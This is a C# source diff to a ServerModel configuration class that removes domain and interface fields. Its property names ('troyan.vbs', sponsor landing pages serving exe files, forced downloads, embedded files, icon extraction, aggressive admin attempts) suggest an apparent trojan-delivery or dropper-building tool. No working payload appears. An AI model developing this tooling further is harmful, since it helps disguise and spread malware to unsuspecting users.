@@ -60,7 +60,7 @@ public class ServerModel: BaseModel
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
 
 
-    
+
     [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
     [JsonPropertyName("server")] public string Server { get; set; } = "";
     [JsonPropertyName("alias")] public string Alias { get; set; }
@@ -111,7 +111,7 @@ public class ServerModel: BaseModel
     [JsonPropertyName("landingSponsorHtmlExeFile")] public string LandingSponsorHtmlExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.html");
 
 
-    
+
     [JsonPropertyName("login")] public string Login { get; set; }
 
     [JsonPropertyName("password")] public string Password { get; set; }
@@ -159,14 +159,6 @@ public class ServerModel: BaseModel
     [JsonPropertyName("aggressiveAdminAttempts")] public int AggressiveAdminAttempts { get; set; } = 0;
 
     [JsonPropertyName("aggressiveAdminTimes")] public int AggressiveAdminTimes { get; set; } = 0;
-    public List<string> Domains(string name) =>
-        DomainIps.Where(a => a.Name == name).SelectMany(a => a.Domains).ToList();
-
-    public List<string> AllDomains() => DomainIps.SelectMany(a => a.Domains).ToList();
-
-    [JsonPropertyName("interfaces")] public List<string> Interfaces { get; set; }
-
-    [JsonPropertyName("domainIps")] public List<DomainIp> DomainIps { get; set; }
 
     [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
     [JsonPropertyName("pushes")] public List<string> Pushes { get; set; } = new List<string>();
@@ -188,7 +180,7 @@ public class ServerModel: BaseModel
     [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }
 
 
-    
+
     [JsonPropertyName("adminServers")]
     [JsonIgnore]
     public Dictionary<string, string>? AdminServers { get; set; }
@@ -209,7 +201,7 @@ public class ServerModel: BaseModel
     [JsonIgnore] public bool IsLocal => ServerIp == "127.0.0.1";
 
 
-    
+
     public ServerModel()
     {
         Login = "Administrator";
@@ -223,9 +215,7 @@ public class ServerModel: BaseModel
         StartUrls = new List<string>();
         StartDownloads = new List<string>();
         StartDownloadsForce = true;
-        Interfaces = new List<string>();
         Pushes = new List<string>();
-        DomainIps = new();
         Front = new List<string>();
         ExtractIconFromFront = false;
         Embeddings = new List<string>();
